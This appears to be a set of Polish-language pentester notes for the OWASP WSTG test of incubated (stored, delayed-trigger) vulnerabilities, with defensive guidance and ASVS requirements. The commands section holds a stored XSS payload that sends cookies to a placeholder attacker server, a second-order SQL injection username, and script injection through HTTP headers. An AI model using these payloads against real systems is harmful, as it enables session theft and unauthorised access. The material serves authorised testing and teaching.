# WSTG-INPV-14 — Testing for Incubated Vulnerability

## Cele

- Identify injections that are stored and require a recall step
- Understand how a recall step could occur
- Set listeners or activate the recall step if possible

## KOMENDY

### Stored payload z opoznionym wyzwoleniem

```bash
# Wstaw XSS payload ktory wyzwoli sie gdy admin otworzy panel
curl -X POST "https://TARGET/feedback" -d "message=<script>fetch('http://ATTACKER_SERVER/cookie?c='+document.cookie)</script>"

```

### Wstaw SQLi payload do pola ktore jest uzywane pozniej

```bash
curl -X POST "https://TARGET/register" -d "username=admin'--&email=test@test.com&password=test123"

```

### Log injection (payload w logach)

```bash
curl -s "https://TARGET/" -H "User-Agent: <script>alert('XSS')</script>"
curl -s "https://TARGET/" -H "Referer: <script>alert('XSS')</script>"

```

### Ustaw listener na odbiór danych

```bash
# Na ATTACKER_SERVER:
# python3 -m http.server 8080

```

## KOMENDY Z WORDLISTAMI

### Kombinacja XSS + SQLi payloadow z wczesniejszych testow

```bash
# XSS: Desktop/WSTG/PayloadsAllTheThings-master/XSS Injection/Intruders/xss_alert.txt
# SQLi: Desktop/WSTG/PayloadsAllTheThings-master/SQL Injection/Intruder/Generic_Fuzz.txt

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Zidentyfikuj pola ktore zapisuja dane i sa wyswietlane pozniej (logi, raporty, panele admina)
2. Wstaw payloady XSS/SQLi i poczekaj na ich wyzwolenie
3. Uzyj Burp Collaborator jako listenera
4. Sprawdz log viewer / admin panel pod katem renderowania payloadow
5. Testuj second-order SQL injection


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — Input_Validation_Cheat_Sheet.md, Cross_Site_Scripting_Prevention_Cheat_Sheet.md

### Incubated Vulnerability — definicja

- Podatnosc **przechowywana** (stored) — payload jest zapisywany i wyzwalany **pozniej**, czesto przez innego uzytkownika
- Roznica vs reflected: reflected dziala natychmiast, incubated wymaga "recall step"
- Czas miedzy wstrzyknieciem a wyzwoleniem moze wynosic minuty, godziny lub dni

### Typowe wektory ataku

| Wektor | Payload wstrzykniety w... | Wyzwalany gdy... |
|--------|--------------------------|-----------------|
| Stored XSS | Formularz feedbacku, komentarz | Admin otwiera panel zgloszeniowy |
| Second-order SQLi | Pole rejestracji (username) | Dane sa uzyte w innym zapytaniu SQL |
| Log injection | User-Agent, Referer header | Administrator przegladasz logi w web UI |
| Email header injection | Pole "imie" lub "email" | System wysyla email z tymi danymi |
| PDF generation XSS | Dane uzytkownika | System generuje PDF z tych danych (wkhtmltopdf, Puppeteer) |

### Obrona

- **Output encoding**: enkoduj dane przy WYSWIETLANIU — nie przy zapisie
- Sanityzuj dane na KAZDYM punkcie wyjscia: HTML, logi, emaile, PDF, CSV
- **Content Security Policy**: ogranicza wykonanie inline JavaScript nawet jesli XSS istnieje
- Loguj bezpiecznie: nie renderuj logow uzytkownikow w HTML bez enkodowania
- Uzyj **Burp Collaborator** do detekcji blind/incubated payloadow

### Testowanie

- Wstaw payloady XSS/SQLi w pola ktore sa wyswietlane **pozniej** (feedback, komentarze, profil)
- Sprawdz panel admina/logi po wstrzyknięciu payloadow
- Testuj User-Agent i Referer injection — logowane i wyswietlane w analytics
- Uzyj out-of-band (OOB) detekcji: DNS/HTTP callback do wykrywania blind execution

## ROZSZERZENIA BURP SUITE

Brak dedykowanych rozszerzen Burp dla tego testu.

---

## Wskazówki ASVS

Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas testu.

### L1 (Podstawowy)

| ID | Sekcja | Wymaganie |
|---|---|---|
| V1.3.1 | Sanitization | Verify that all untrusted HTML input from WYSIWYG editors or similar is sanitized using a well-known and secure HTML sanitization library or framework feature. |

### L2 (Standardowy)

| ID | Sekcja | Wymaganie |
|---|---|---|
| V1.3.3 | Sanitization | Verify that data being passed to a potentially dangerous context is sanitized beforehand to enforce safety measures, such as only allowing characters which are safe for this context and trimming input which is too long. |
